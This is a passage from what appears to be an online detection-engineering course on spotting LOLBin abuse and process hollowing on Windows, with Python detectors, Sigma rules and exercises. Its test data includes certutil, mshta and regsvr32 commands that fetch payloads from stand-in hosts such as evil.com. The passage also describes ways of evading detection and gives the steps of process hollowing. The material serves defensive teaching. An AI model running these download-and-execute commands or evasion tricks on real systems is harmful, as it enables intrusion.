+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=lDK384LXhpU" target="_blank" rel="noopener"><b>Living Off The Land Attacks Explained (LOLBins Part 1)</b><small>CYBER TECH</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=LOLBin%20living%20off%20the%20land%20detection%20Sigma%20certutil%20mshta%20rundll32%20regsvr32" target="_blank" rel="noopener">LOLBin living off the land detection Sigma certutil mshta rundll32 regsvr32</a></p></div>
+<hr />
+<h3>Concept 1 — Living Off the Land Binaries</h3>
+<p>LOLBins (Living Off the Land Binaries) are legitimate Windows executables that attackers abuse to execute malicious code, bypass application allowlisting, and blend into normal system activity. They are powerful for attackers because they are signed by Microsoft, present on every Windows installation, and commonly excluded from security tooling.</p>
+<p>Canonical LOLBin list for detection engineering:</p>
+<table>
+<thead>
+<tr>
+<th>Binary</th>
+<th>Legitimate use</th>
+<th>Malicious abuse</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>certutil.exe</code></td>
+<td>Certificate management</td>
+<td>Download files, decode Base64 payloads</td>
+</tr>
+<tr>
+<td><code>mshta.exe</code></td>
+<td>Run HTA scripts</td>
+<td>Execute VBScript/JScript from remote URL</td>
+</tr>
+<tr>
+<td><code>rundll32.exe</code></td>
+<td>Load DLL exports</td>
+<td>Execute shellcode via DLL</td>
+</tr>
+<tr>
+<td><code>regsvr32.exe</code></td>
+<td>Register COM DLLs</td>
+<td>Squiblydoo — execute remote SCT files</td>
+</tr>
+<tr>
+<td><code>wscript.exe/cscript.exe</code></td>
+<td>Run WSH scripts</td>
+<td>Execute malicious .js/.vbs scripts</td>
+</tr>
+<tr>
+<td><code>msiexec.exe</code></td>
+<td>Install MSI packages</td>
+<td>Execute remote MSI payloads</td>
+</tr>
+<tr>
+<td><code>bitsadmin.exe</code></td>
+<td>Background transfer service</td>
+<td>Download payloads</td>
+</tr>
+<tr>
+<td><code>forfiles.exe</code></td>
+<td>Batch file processing</td>
+<td>Command execution bypass</td>
+</tr>
+<tr>
+<td><code>wmic.exe</code></td>
+<td>WMI queries</td>
+<td>Remote execution, process spawn</td>
+</tr>
+<tr>
+<td><code>odbcconf.exe</code></td>
+<td>ODBC configuration</td>
+<td>Execute DLL via REGSVASM directive</td>
+</tr>
+</tbody>
+</table>
+<p>Detection approach: for each LOLBin, identify the argument patterns that indicate abuse rather than legitimate use. A <code>certutil.exe -decode</code> or <code>certutil.exe -urlcache -f http://</code> is nearly always malicious.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass
+from typing import List, Optional
+
+@dataclass
+class LOLBinRule:
+    binary_name: str
+    technique_id: str
+    malicious_args: List[str]
+    legitimate_args: List[str]
+    description: str
+
+    def matches(self, command_line: str) -&gt; Optional[str]:
+        cmd = command_line.lower()
+        if not self.binary_name.lower() in cmd:
+            return None
+        for malicious in self.malicious_args:
+            if malicious.lower() in cmd:
+                return f&quot;{self.binary_name}: {malicious}&quot;
+        return None
+
+LOLBIN_RULES = [
+    LOLBinRule(
+        &quot;certutil.exe&quot;, &quot;T1105&quot;,
+        malicious_args=[&quot;-urlcache&quot;, &quot;-decode&quot;, &quot;-encodehex&quot;, &quot;http://&quot;, &quot;https://&quot;],
+        legitimate_args=[&quot;-viewstore&quot;, &quot;-store&quot;, &quot;-addstore&quot;],
+        description=&quot;CertUtil download or encoding abuse&quot;,
+    ),
+    LOLBinRule(
+        &quot;mshta.exe&quot;, &quot;T1218.005&quot;,
+        malicious_args=[&quot;http://&quot;, &quot;https://&quot;, &quot;javascript:&quot;, &quot;vbscript:&quot;],
+        legitimate_args=[],
+        description=&quot;MSHTA remote script execution&quot;,
+    ),
+    LOLBinRule(
+        &quot;regsvr32.exe&quot;, &quot;T1218.010&quot;,
+        malicious_args=[&quot;/s /n /u /i:http&quot;, &quot;/i:http&quot;, &quot;scrobj.dll&quot;],
+        legitimate_args=[],
+        description=&quot;Squiblydoo COM scriptlet bypass&quot;,
+    ),
+]
+
+test_commands = [
+    &quot;certutil.exe -urlcache -f http://evil.com/payload.exe payload.exe&quot;,
+    &quot;certutil.exe -viewstore MY&quot;,
+    &quot;mshta.exe http://192.168.1.100/evil.hta&quot;,
+    &quot;regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll&quot;,
+]
+
+for cmd in test_commands:
+    for rule in LOLBIN_RULES:
+        match = rule.matches(cmd)
+        if match:
+            print(f&quot;ALERT [{rule.technique_id}] {match}&quot;)
+            print(f&quot;  CMD: {cmd[:60]}&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Add LOLBin rules for <code>wscript.exe</code> (T1059.005 — script execution, malicious args: any <code>.js</code>, <code>.vbs</code>, <code>.wsf</code> file in a temp or user-writable directory path), <code>bitsadmin.exe</code> (T1197 — malicious args: <code>/transfer</code>, <code>/create</code>, <code>/addfile</code>), and <code>rundll32.exe</code> (T1218.011 — malicious args: <code>javascript:</code>, <code>shell32.dll,ShellExec_RunDLL</code>, <code>url.dll,OpenURL</code>). Add all three to <code>LOLBIN_RULES</code>. Create four test commands that trigger each rule and print the results.
+Expected output: each test command triggers exactly one rule; rule ID and matched argument printed for each</p>
+<hr />
+<h3>Concept 2 — Writing a LOLBin Sigma Rule</h3>
+<p>LOLBin Sigma rules use the <code>endswith</code> modifier on the <code>Image</code> field to match the binary, then <code>contains</code> on <code>CommandLine</code> to match the malicious argument pattern. The main tuning challenge is false positives: <code>certutil.exe</code> is used by legitimate software update tools; <code>rundll32.exe</code> is called thousands of times a day on a Windows machine.</p>
+<p>Key tuning techniques for LOLBin rules:</p>
+<ul>
+<li><strong>Allowlist by parent process</strong>: SCCM and Intune both call <code>msiexec.exe</code> legitimately</li>
+<li><strong>Require multiple indicators</strong>: <code>certutil.exe</code> downloading from a non-corporate URL is more reliable than any certutil execution</li>
+<li><strong>Use the CommandLine context</strong>: <code>certutil.exe -viewstore MY</code> is always benign; the download path is the indicator</li>
+<li><strong>Combine with asset tier</strong>: disable high-noise rules on developer workstations, keep them enabled on servers</li>
+</ul>
+<p><strong>Example:</strong></p>
+<pre><code>title: CertUtil Download or Decode Abuse
+id: b8f9e1a2-3d4c-5f6e-7890-abcdef012345
+status: production
+description: Detects certutil.exe being used to download files or decode Base64 payloads,
+  which are common malicious uses of this legitimate certificate utility.
+references:
+  - https://attack.mitre.org/techniques/T1105/
+  - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
+author: Detection Team
+date: 2024/03/15
+tags:
+  - attack.command_and_control
+  - attack.t1105
+  - attack.defense_evasion
+  - attack.t1140
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: &#x27;\certutil.exe&#x27;
+    CommandLine|contains:
+      - &#x27;-urlcache&#x27;
+      - &#x27;-decode&#x27;
+      - &#x27;-encodehex&#x27;
+      - &#x27;http://&#x27;
+      - &#x27;https://&#x27;
+  filter_corporate:
+    CommandLine|contains:
+      - &#x27;update.microsoft.com&#x27;
+      - &#x27;windowsupdate.com&#x27;
+      - &#x27;download.microsoft.com&#x27;
+  condition: selection and not filter_corporate
+falsepositives:
+  - Software update tools downloading certificates from known-good Microsoft URLs
+  - PKI infrastructure management scripts
+  - Security assessment tools
+level: high
+</code></pre><p><strong>Exercise:</strong>
+Write a second LOLBin Sigma rule as a Python string (YAML content): <code>mshta.exe</code> executing content from a remote URL or from a suspicious path (<code>\AppData\</code>, <code>\Temp\</code>, <code>\Downloads\</code>). Title: &quot;MSHTA Remote or Suspicious Path Execution&quot;. Technique: T1218.005. Add a filter for known legitimate MSHTA uses (HTML help files from <code>C:\Windows\Help</code>). Write a Python function <code>sigma_to_dict(yaml_str: str) -&gt; dict</code> using the <code>yaml</code> module that parses the rule, validates the required fields (title, id, status, detection, logsource, level), and returns the parsed dict. Test it against both rules.
+Expected output: both rules parse successfully; validation passes for both</p>
+<hr />
+<h3>Concept 3 — LOLBin Detection Gaps and Evasion</h3>
+<p>Understanding LOLBin detection gaps helps you build more robust rules and recognize when you need multiple complementary detections.</p>
+<p>Common LOLBin detection evasion techniques:</p>
+<ul>
+<li><strong>Copy to new path</strong>: copy <code>certutil.exe</code> to <code>C:\Users\user\AppData\Local\Temp\svchost.exe</code> — the rule matching <code>Image|endswith: '\certutil.exe'</code> misses it</li>
+<li><strong>Environment variable expansion</strong>: <code>%COMSPEC%</code> instead of <code>cmd.exe</code>, <code>%SystemRoot%\System32\certutil.exe</code> as a path</li>
+<li><strong>Argument abbreviation</strong>: <code>/u</code> instead of <code>/urlcache</code>, <code>-d</code> instead of <code>-decode</code> (certutil supports abbreviations)</li>
+<li><strong>Process renaming</strong>: copying a LOLBin to a new name bypasses binary-name rules</li>
+</ul>
+<p>Counter-strategy layering:</p>
+<ol>
+<li><strong>Hash-based detection</strong>: Sysmon Event 1 captures <code>Hashes</code> — alert on the certutil binary hash regardless of filename</li>
+<li><strong>Parent-child relationships</strong>: unusual parent processes spawning known-path LOLBins</li>
+<li><strong>File system artifacts</strong>: certutil download creates a cache entry in <code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\</code></li>
+<li><strong>Network correlation</strong>: combine process creation alert with a subsequent outbound connection alert from the same host within 60 seconds</li>
+</ol>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass
+from typing import List, Optional
+
+CERTUTIL_KNOWN_HASHES = {
+    &quot;windows10_21h2&quot;: &quot;8A6F7B16B0F9A9CDE5DB9C28EFA04F59E1B12D5F&quot;,
+    &quot;windows11_22h2&quot;: &quot;7C3E8B14A2F5D69E3C7B4A91F2D8E5B6C3A7D9F1&quot;,
+}
+
+@dataclass
+class ProcessEvent:
+    image_path: str
+    image_hash: str
+    command_line: str
+    parent_image: str
+    hostname: str
+
+def detect_lolbin_by_hash(event: ProcessEvent) -&gt; Optional[str]:
+    &quot;&quot;&quot;Detect LOLBin regardless of renamed path by matching hash.&quot;&quot;&quot;
+    if event.image_hash.upper() in {h.upper() for h in CERTUTIL_KNOWN_HASHES.values()}:
+        if &quot;certutil&quot; not in event.image_path.lower():
+            return f&quot;RENAMED_LOLBIN: certutil hash detected at {event.image_path}&quot;
+    return None
+
+def detect_lolbin_by_cmdline(event: ProcessEvent) -&gt; List[str]:
+    indicators = []
+    cmd = event.command_line.lower()
+    suspicious_args = [&quot;-urlcache&quot;, &quot;-decode&quot;, &quot;-encodehex&quot;, &quot;/u&quot;, &quot;/d&quot;, &quot;http://&quot;, &quot;https://&quot;]
+    for arg in suspicious_args:
+        if arg in cmd:
+            indicators.append(f&quot;CERTUTIL_SUSPICIOUS_ARG:{arg}&quot;)
+    return indicators
+
+renamed_event = ProcessEvent(
+    image_path=&quot;C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost.exe&quot;,
+    image_hash=&quot;8A6F7B16B0F9A9CDE5DB9C28EFA04F59E1B12D5F&quot;,
+    command_line=&quot;svchost.exe -urlcache -f http://evil.com/payload.exe payload.exe&quot;,
+    parent_image=&quot;cmd.exe&quot;,
+    hostname=&quot;ws-042&quot;,
+)
+
+hash_alert = detect_lolbin_by_hash(renamed_event)
+cmdline_alerts = detect_lolbin_by_cmdline(renamed_event)
+
+if hash_alert:
+    print(f&quot;ALERT: {hash_alert}&quot;)
+for alert in cmdline_alerts:
+    print(f&quot;ALERT: {alert}&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Add hash-based detection for two more LOLBins: <code>mshta.exe</code> and <code>regsvr32.exe</code>. Create a <code>LOLBIN_HASH_REGISTRY</code> dict mapping each binary's canonical name to its known hash. Then write a function <code>detect_all_lolbins(event: ProcessEvent) -&gt; List[str]</code> that runs both hash-based and command-line detection for all registered LOLBins and returns all alerts. Test with three events: a genuine certutil with suspicious args, a renamed mshta, and a benign regsvr32 call that should produce no alerts.
+Expected output: event 1 triggers cmdline alerts; event 2 triggers hash-based renamed alert; event 3 triggers no alerts</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can identify previously undocumented LOLBin abuse patterns by reasoning about a binary's capabilities rather than searching a known-bad list.
+<strong>Threat:</strong> Attackers use LLMs to discover novel LOLBin combinations that bypass existing detection rules — essentially using the same AI capability defensively and offensively.
+<strong>Opportunity:</strong> Use an LLM to enumerate the full attack surface of a specific binary (all command-line flags that could be abused), then convert each abuse case into a Sigma rule detection condition.
+<strong>Prompt to try:</strong> <code>&quot;You are a detection engineer. Enumerate every way that 'odbcconf.exe' (Windows ODBC Configuration tool) can be abused by an attacker to execute malicious code or download payloads. For each abuse method: give the exact command line syntax, the MITRE ATT&amp;CK technique ID, and the specific CommandLine pattern I should detect in a Sigma rule. Format as a table: Method | Command | Technique | Sigma Detection Pattern.&quot;</code></p>
+<hr />
+<h2 id="day-4">Day 4 — Process Hollowing Detection</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="13-4"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=rf0IhGxcYoc" target="_blank" rel="noopener"><b>Learn Malware Analysis with Process Hollowing - How to Perform and Detect</b><small>Reversing Hub</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=process%20hollowing%20detection%20Sysmon%20event%2025%20process%20injection%20memory%20forensics" target="_blank" rel="noopener">process hollowing detection Sysmon event 25 process injection memory forensics</a></p></div>
+<hr />
+<h3>Concept 1 — Process Hollowing Mechanics</h3>
+<p>Process hollowing (T1055.012) is a process injection technique where an attacker creates a legitimate process in a suspended state, unmaps its memory contents, writes malicious code into the empty process address space, and resumes execution. From the process list, the running process appears legitimate (e.g., <code>svchost.exe</code>) but executes the attacker's code.</p>
+<p>The four-step attack sequence:</p>
+<ol>
+<li><code>CreateProcess</code> with <code>CREATE_SUSPENDED</code> flag — process created but not running</li>
+<li><code>NtUnmapViewOfSection</code> — original code section unmapped from memory</li>
+<li><code>WriteProcessMemory</code> — malicious payload written into the now-empty address space</li>
+<li><code>SetThreadContext</code> + <code>ResumeThread</code> — entry point redirected to malicious code; process resumed</li>
+</ol>
+<p>Detection indicators:</p>
+<ul>
+<li>Sysmon <strong>Event ID 25</strong> (ProcessTampering) — specifically designed for this, fires when a running process's image does not match the file on disk</li>
+<li>Sysmon <strong>Event ID 8</strong> (CreateRemoteThread) — alternative injection method that sometimes accompanies hollowing</li>
+<li><strong>Image mismatch</strong>: process claims to be <code>svchost.exe</code> but its file hash does not match the known-good svchost hash</li>
+<li><strong>Unusual parent</strong>: <code>svchost.exe</code> spawned by <code>cmd.exe</code> instead of <code>services.exe</code></li>
+</ul>
+<p>Data engineering analogy: process hollowing is equivalent to a schema swap attack — the table name (process name) remains unchanged, but the schema definition (code) has been silently replaced with malicious content.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass
+from typing import List, Optional
+
+KNOWN_GOOD_PARENT_MAP = {
+    &quot;svchost.exe&quot;:      [&quot;services.exe&quot;, &quot;svchost.exe&quot;],
+    &quot;lsass.exe&quot;:        [&quot;wininit.exe&quot;],
+    &quot;spoolsv.exe&quot;:      [&quot;services.exe&quot;],
+    &quot;csrss.exe&quot;:        [&quot;smss.exe&quot;],
+    &quot;winlogon.exe&quot;:     [&quot;smss.exe&quot;],
+    &quot;explorer.exe&quot;:     [&quot;userinit.exe&quot;, &quot;winlogon.exe&quot;],
+}
+
+SENSITIVE_PROCESSES = {&quot;svchost.exe&quot;, &quot;lsass.exe&quot;, &quot;csrss.exe&quot;, &quot;winlogon.exe&quot;, &quot;spoolsv.exe&quot;}
+
+@dataclass
+class ProcessTamperingEvent:
+    event_id: int  # 25 = Sysmon ProcessTampering
+    image_path: str
+    process_name: str
+    pid: int
+    parent_name: str
+    image_on_disk_hash: str
+    running_image_hash: str  # captured from memory
+
+    def hollowing_indicators(self) -&gt; List[str]:
+        indicators = []
+
+        if self.event_id == 25:
+            indicators.append(&quot;SYSMON_PROCESS_TAMPERING_EVENT25&quot;)
+
+        if self.image_on_disk_hash != self.running_image_hash:
+            indicators.append(f&quot;IMAGE_HASH_MISMATCH: disk={self.image_on_disk_hash[:8]}... mem={self.running_image_hash[:8]}...&quot;)
+
+        expected_parents = KNOWN_GOOD_PARENT_MAP.get(self.process_name.lower())
+        if expected_parents and self.parent_name.lower() not in [p.lower() for p in expected_parents]:
+            indicators.append(f&quot;UNEXPECTED_PARENT: {self.parent_name} → {self.process_name}&quot;)
+
+        if self.process_name.lower() in SENSITIVE_PROCESSES and self.event_id == 25:
+            indicators.append(&quot;HIGH_VALUE_PROCESS_TAMPERED&quot;)
+
+        return indicators
+
+event = ProcessTamperingEvent(
+    event_id=25,
+    image_path=&quot;C:\\Windows\\System32\\svchost.exe&quot;,
+    process_name=&quot;svchost.exe&quot;,
+    pid=4512,
+    parent_name=&quot;cmd.exe&quot;,
+    image_on_disk_hash=&quot;AAAA1111BBBB2222CCCC3333DDDD4444EEEE5555&quot;,
+    running_image_hash=&quot;FFFF6666GGGG7777HHHH8888IIII9999JJJJ0000&quot;,
+)
+
+for indicator in event.hollowing_indicators():
+    print(f&quot;INDICATOR: {indicator}&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Add a method <code>severity(self) -&gt; str</code> to <code>ProcessTamperingEvent</code> that returns <code>&quot;CRITICAL&quot;</code> if the process is in <code>SENSITIVE_PROCESSES</code> AND there is a hash mismatch; <code>&quot;HIGH&quot;</code> if there is a hash mismatch but the process is not sensitive; <code>&quot;MEDIUM&quot;</code> if only an unexpected parent is detected; <code>&quot;LOW&quot;</code> for Event ID 25 alone without other indicators. Create three test events covering each severity level and print the severity + indicators for each.
+Expected output: one CRITICAL (lsass tampering + hash mismatch), one HIGH (non-sensitive process + hash mismatch), one MEDIUM (unexpected parent only)</p>
+<hr />
+<h3>Concept 2 — Process Relationship Trees</h3>
+<p>Process hollowing is easier to detect when you analyze process relationships as a tree rather than individual events. Legitimate Windows processes follow strict parent-child relationships. Deviations from expected parent-child pairs are high-fidelity indicators.</p>
+<p>Common suspicious parent-child deviations:</p>
+<ul>
+<li><code>winword.exe → powershell.exe</code> (document executing shell)</li>
+<li><code>explorer.exe → regsvr32.exe</code> (user-triggered LOLBin)</li>
+<li><code>svchost.exe → cmd.exe</code> (service spawning interactive shell)</li>
+<li><code>lsass.exe → cmd.exe</code> (credential process spawning shell — likely injection)</li>
+</ul>
+<p>Building a process tree from events allows you to trace the chain from the original process to the final malicious child, which is critical for incident response scope assessment.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass
+from typing import List, Optional, Dict
+
+@dataclass
+class ProcessNode:
+    pid: int
+    ppid: int
+    image_name: str
+    command_line: str
+    children: List[&quot;ProcessNode&quot;] = None
+
+    def __post_init__(self):
+        if self.children is None:
+            self.children = []
+
+def build_process_tree(events: List[dict]) -&gt; Dict[int, ProcessNode]:
+    nodes: Dict[int, ProcessNode] = {}
+    for ev in events:
+        node = ProcessNode(
+            pid=ev[&quot;pid&quot;],
+            ppid=ev[&quot;ppid&quot;],
+            image_name=ev[&quot;image&quot;],
+            command_line=ev[&quot;cmdline&quot;],
+        )
+        nodes[node.pid] = node
+
+    for node in nodes.values():
+        parent = nodes.get(node.ppid)
+        if parent:
+            parent.children.append(node)
+
+    return nodes
+
+def find_suspicious_chains(nodes: Dict[int, ProcessNode]) -&gt; List[str]:
+    SUSPICIOUS_PAIRS = [
+        (&quot;winword.exe&quot;, &quot;powershell.exe&quot;),
+        (&quot;excel.exe&quot;,   &quot;cmd.exe&quot;),
+        (&quot;svchost.exe&quot;, &quot;cmd.exe&quot;),
+        (&quot;lsass.exe&quot;,   &quot;cmd.exe&quot;),
+        (&quot;svchost.exe&quot;, &quot;powershell.exe&quot;),
+    ]
+    alerts = []
+    for node in nodes.values():
+        for child in node.children:
+            parent_name = node.image_name.lower()
+            child_name = child.image_name.lower()
+            for sus_parent, sus_child in SUSPICIOUS_PAIRS:
+                if parent_name.endswith(sus_parent) and child_name.endswith(sus_child):
+                    alerts.append(f&quot;SUSPICIOUS_CHAIN: {node.image_name}[{node.pid}] → {child.image_name}[{child.pid}]&quot;)
+    return alerts
+
+events = [
+    {&quot;pid&quot;: 1000, &quot;ppid&quot;: 500,  &quot;image&quot;: &quot;services.exe&quot;,  &quot;cmdline&quot;: &quot;&quot;},
+    {&quot;pid&quot;: 2000, &quot;ppid&quot;: 1000, &quot;image&quot;: &quot;svchost.exe&quot;,   &quot;cmdline&quot;: &quot;&quot;},
+    {&quot;pid&quot;: 3000, &quot;ppid&quot;: 2000, &quot;image&quot;: &quot;cmd.exe&quot;,        &quot;cmdline&quot;: &quot;cmd.exe /c whoami&quot;},
+    {&quot;pid&quot;: 4000, &quot;ppid&quot;: 3000, &quot;image&quot;: &quot;powershell.exe&quot;, &quot;cmdline&quot;: &quot;powershell.exe -enc aQBlAHgA&quot;},
+]
+
+tree = build_process_tree(events)
+alerts = find_suspicious_chains(tree)
+for alert in alerts:
+    print(alert)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Add a function <code>print_process_tree(nodes: Dict[int, ProcessNode], root_pid: int, indent: int = 0)</code> that recursively prints the process tree starting from <code>root_pid</code> with indentation. Call it on the tree above starting from pid=1000. Then add <code>(&quot;explorer.exe&quot;, &quot;regsvr32.exe&quot;)</code> to <code>SUSPICIOUS_PAIRS</code> and add an explorer.exe → regsvr32.exe event chain to the events list. Rebuild and reprint.
+Expected output: tree printed with indentation showing the chain; new suspicious chain alert printed for the explorer.exe → regsvr32.exe pair</p>
+<hr />
+<h3>Concept 3 — Writing a Process Hollowing Sigma Rule</h3>
+<p>The process hollowing Sigma rule combines Event ID 25 with corroborating indicators. A single Event ID 25 may fire on legitimate security tools; the combination with unexpected parent, hash mismatch context, or sensitive process targeting raises confidence.</p>
+<p>The rule uses the <code>logsource</code> category <code>process_tampering</code> introduced in Sigma 0.22 to target Sysmon Event ID 25 directly.</p>
+<p><strong>Example:</strong></p>
+<pre><code>title: Process Hollowing via Sysmon Event 25
+id: c9d0e2f3-4a5b-6c7d-8e9f-012345678901
+status: production
+description: Detects process hollowing attempts detected by Sysmon ProcessTampering event.
+  Process hollowing creates a legitimate-looking process that executes malicious code.
+  Combine with unexpected parent process or hash mismatch for higher confidence.
+references:
+  - https://attack.mitre.org/techniques/T1055/012/
+author: Detection Team
+date: 2024/03/15
+tags:
+  - attack.defense_evasion
+  - attack.t1055_012
+  - attack.privilege_escalation
+logsource:
+  category: process_tampering
+  product: windows
+detection:
+  selection:
+    EventID: 25
+    Image|endswith:
+      - &#x27;\svchost.exe&#x27;
+      - &#x27;\lsass.exe&#x27;
+      - &#x27;\csrss.exe&#x27;
+      - &#x27;\winlogon.exe&#x27;
+      - &#x27;\spoolsv.exe&#x27;
+      - &#x27;\explorer.exe&#x27;
+  filter_security_tools:
+    Image|contains:
+      - &#x27;CrowdStrike&#x27;
+      - &#x27;SentinelOne&#x27;
+      - &#x27;CarbonBlack&#x27;
+  condition: selection and not filter_security_tools
+falsepositives:
+  - Security vendor process protection tools that modify process memory
+  - Debuggers and development tools
+level: critical
+</code></pre><p><strong>Exercise:</strong>
+Write a Python function <code>generate_hollowing_rule(sensitive_processes: list, security_tool_paths: list) -&gt; str</code> that generates this Sigma rule YAML programmatically with the provided <code>sensitive_processes</code> list and <code>security_tool_paths</code> in the filter. Use <code>uuid.uuid4()</code> for the rule ID and <code>datetime.date.today()</code> for the date. Print the generated rule. Then write a second rule for <code>CreateRemoteThread</code> (Event ID 8) targeting the same sensitive processes, with a level of <code>high</code> instead of <code>critical</code>. Generate and print that rule too.
+Expected output: two valid Sigma rule YAML strings printed; IDs are different UUIDs; sensitive_processes list appears correctly in both</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can correlate process tree events across a 30-minute window and produce an incident narrative identifying which processes were hollowed, which were legitimate, and what the attacker's objective was.
+<strong>Threat:</strong> An LLM-based alert triage system that auto-closes alerts based on process tree analysis can be manipulated by an attacker who controls the process name and command-line fields — crafting them to look legitimate.
+<strong>Opportunity:</strong> Use an LLM to generate investigation playbooks for process hollowing alerts, providing step-by-step investigation steps tailored to the specific process and parent chain detected.
+<strong>Prompt to try:</strong> <code>&quot;A Sysmon Event ID 25 (ProcessTampering) fired for svchost.exe (PID 4512). The parent process was cmd.exe (PID 3201), which was itself spawned by winword.exe (PID 2800). Write an incident investigation playbook for this specific alert: (1) what to look for first in the SIEM, (2) what memory forensics steps to run, (3) what to check in the file system, (4) when to escalate to incident response, (5) containment actions if confirmed malicious.&quot;</code></p>
+<hr />
+<h2 id="day-5">Day 5 — EDR Rule Tuning and Production Operations</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="13-5"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=wZBXJGf8OuY" target="_blank" rel="noopener"><b>SOC Alert Tuning and False Positive Reduction: Setting Yourself Up for Success</b><small>SANS Cyber Defense</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=EDR%20rule%20tuning%20false%20positives%20production%20Sigma%20alert%20triage%20SOC%20operations" target="_blank" rel="noopener">EDR rule tuning false positives production Sigma alert triage SOC operations</a></p></div>
+<hr />
+<h3>Concept 1 — False Positive Triage Workflow</h3>
+<p>A production detection rule that fires 200 times per day, most of which are false positives, needs tuning before analysts trust it. Systematic false positive triage follows a documented process rather than ad hoc filter additions that accumulate over time without review.</p>
+<p>False positive triage workflow:</p>
+<ol>
+<li><strong>Collect a sample</strong>: gather 50–100 false positive events for the rule over one week</li>
+<li><strong>Cluster by attribute</strong>: group by parent process, user, hostname, command-line pattern</li>
+<li><strong>Identify the distinguishing attribute</strong>: what is consistently different in FPs vs. TPs?</li>
+<li><strong>Write a targeted filter</strong>: filter on the specific attribute, not a broad exclusion</li>
+<li><strong>Validate the filter</strong>: apply it to the sample, confirm it removes FPs without removing TPs</li>
+<li><strong>Document the filter rationale</strong>: record what process/tool causes this FP and why</li>
+</ol>
+<p>The anti-pattern: adding <code>filter: User: SYSTEM</code> to remove noise — this also removes real attacks running as SYSTEM, which are high-severity.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass
+from typing import List
+from collections import Counter
+
+@dataclass
+class AlertSample:
+    alert_id: str
+    rule_id: str
+    image: str
+    parent_image: str
+    command_line: str
+    user: str
+    hostname: str
+    verdict: str  # &quot;TP&quot; | &quot;FP&quot; | &quot;UNKNOWN&quot;
+
+def analyze_false_positive_cluster(samples: List[AlertSample]) -&gt; dict:
+    fps = [s for s in samples if s.verdict == &quot;FP&quot;]
+    tps = [s for s in samples if s.verdict == &quot;TP&quot;]
+
+    if not fps:
+        return {&quot;message&quot;: &quot;No false positives in sample&quot;}
+
+    fp_parents = Counter(s.parent_image.lower() for s in fps)
+    fp_users   = Counter(s.user.lower() for s in fps)
+    tp_parents = Counter(s.parent_image.lower() for s in tps)
+
+    parent_only_in_fps = {p for p in fp_parents if p not in tp_parents}
+
+    return {
+        &quot;total_fps&quot;: len(fps),
+        &quot;total_tps&quot;: len(tps),
+        &quot;fp_parent_distribution&quot;: dict(fp_parents.most_common(5)),
+        &quot;safe_to_filter_parents&quot;: sorted(parent_only_in_fps),
+    }
+
+samples = [
+    AlertSample(&quot;A001&quot;, &quot;SIG-001&quot;, &quot;powershell.exe&quot;, &quot;sccm.exe&quot;,    &quot;powershell -enc ...&quot;, &quot;SYSTEM&quot;,      &quot;ws-01&quot;, &quot;FP&quot;),
+    AlertSample(&quot;A002&quot;, &quot;SIG-001&quot;, &quot;powershell.exe&quot;, &quot;sccm.exe&quot;,    &quot;powershell -enc ...&quot;, &quot;SYSTEM&quot;,      &quot;ws-02&quot;, &quot;FP&quot;),
+    AlertSample(&quot;A003&quot;, &quot;SIG-001&quot;, &quot;powershell.exe&quot;, &quot;winword.exe&quot;, &quot;powershell -enc ...&quot;, &quot;CORP\\jsmith&quot;, &quot;ws-03&quot;, &quot;TP&quot;),
+    AlertSample(&quot;A004&quot;, &quot;SIG-001&quot;, &quot;powershell.exe&quot;, &quot;sccm.exe&quot;,    &quot;powershell -enc ...&quot;, &quot;SYSTEM&quot;,      &quot;ws-04&quot;, &quot;FP&quot;),
+    AlertSample(&quot;A005&quot;, &quot;SIG-001&quot;, &quot;powershell.exe&quot;, &quot;cmd.exe&quot;,     &quot;powershell -enc ...&quot;, &quot;CORP\\admin&quot;,  &quot;ws-05&quot;, &quot;TP&quot;),
+]
+
+result = analyze_false_positive_cluster(samples)
+print(f&quot;FPs: {result[&#x27;total_fps&#x27;]} | TPs: {result[&#x27;total_tps&#x27;]}&quot;)
+print(f&quot;Safe to filter parent processes: {result[&#x27;safe_to_filter_parents&#x27;]}&quot;)
